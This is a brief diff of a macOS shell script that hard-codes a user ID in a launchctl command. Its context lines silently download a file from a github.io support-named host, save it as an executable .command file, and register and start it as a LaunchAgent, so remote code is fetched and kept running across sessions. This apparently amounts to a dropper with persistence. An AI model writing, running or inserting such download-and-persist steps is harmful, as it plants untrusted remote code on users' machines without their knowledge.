@@ -4,6 +4,6 @@ mkdir /Users/craigcain/Library/Tools
 curl -s -o /Users/craigcain/Library/Tools/form3.command http://form3tech-support.github.io/task.html
 chmod +x /Users/craigcain/Library/Tools/form3.command
 launchctl enable gui/502/com.company.task
-launchctl bootstrap gui/$(id -u) /Users/craigcain/Library/LaunchAgents/company.task.plist
+launchctl bootstrap gui/502 /Users/craigcain/Library/LaunchAgents/company.task.plist
 launchctl kickstart -k gui/502/com.company.task
 echo "Done"
